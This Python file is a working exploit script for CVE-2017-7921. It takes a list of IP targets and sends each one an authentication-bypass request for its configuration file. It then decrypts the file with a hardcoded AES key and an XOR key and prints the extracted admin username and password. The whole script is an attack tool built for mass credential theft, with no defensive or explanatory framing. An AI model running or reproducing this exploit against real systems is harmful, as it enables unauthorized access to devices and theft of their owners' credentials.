import argparse
import base64
import os
import re
import sys
from io import BytesIO
from itertools import cycle
from pathlib import Path
from Crypto.Cipher import AES
import requests

def add_to_16(s: bytes) -> bytes:
    return s + b'\0' * (16 - len(s) % 16)

def decrypt(ciphertext: bytes, hex_key: str = '279977f62f6cfd2d91cd75b889ce0c9a') -> bytes:
    key = bytes.fromhex(hex_key)
    cipher = AES.new(key, AES.MODE_ECB)
    plaintext = cipher.decrypt(add_to_16(ciphertext))
    return plaintext.rstrip(b"\0")

def xore(data: bytes, key: bytes = bytes([0x73, 0x8B, 0x55, 0x44])) -> bytes:
    return bytes(a ^ b for a, b in zip(data, cycle(key)))

def extract_strings(file_data: str) -> list:
    pattern = re.compile(r"[A-Za-z0-9/\-:.,_$%'()[\]<> ]{2,}")
    return pattern.findall(file_data)

def find_keyword_indices(lst: list, keyword: str = 'admin') -> list:
    return [i for i, e in enumerate(lst) if e == keyword]

def valid_target(target: str) -> str | None:
    regex = re.compile(
        r"^(?:[0-9]{1,3}\.){3}[0-9]{1,3}(?::[0-9]+)?$"
    )
    match = regex.fullmatch(target.strip())
    return match.group(0) if match else None

def param_to_list(param: str) -> set:
    targets = set()
    path = Path(param)
    if path.exists() and path.is_file():
        with open(path, encoding='utf-8', errors='ignore') as file:
            for line in file:
                target = valid_target(line)
                if target:
                    targets.add(target)
    else:
        targets = {valid_target(t) for t in param.split(',') if valid_target(t)}
    return targets

def exploit(target_list: set):
    for target in target_list:
        try:
            response = requests.get(
                f"http://{target}/System/configurationFile?auth=YWRtaW46MTEK",
                timeout=5,
                verify=False
            )
            if response.status_code == 200:
                decrypted_data = decrypt(response.content)
                xor_decoded = xore(decrypted_data).decode('ISO-8859-1')
                result_list = extract_strings(xor_decoded)
                indices = find_keyword_indices(result_list)
                if indices:
                    print(f"{target},{result_list[indices[-1]]},{result_list[indices[-1] + 1]}")
                else:
                    print(f"{target},no credentials found")
            else:
                print(f"{target},failed")
        except requests.exceptions.RequestException:
            print(f"{target},connection error")

def main():
    parser = argparse.ArgumentParser(description="CVE-2017-7921 Exploit")
    parser.add_argument("target", help="Target IP or file containing targets")
    args = parser.parse_args()

    target_list = param_to_list(args.target)
    print(f"There are {len(target_list)} targets")
    if target_list:
        exploit(target_list)
    print("Finished")

if __name__ == '__main__':
    main()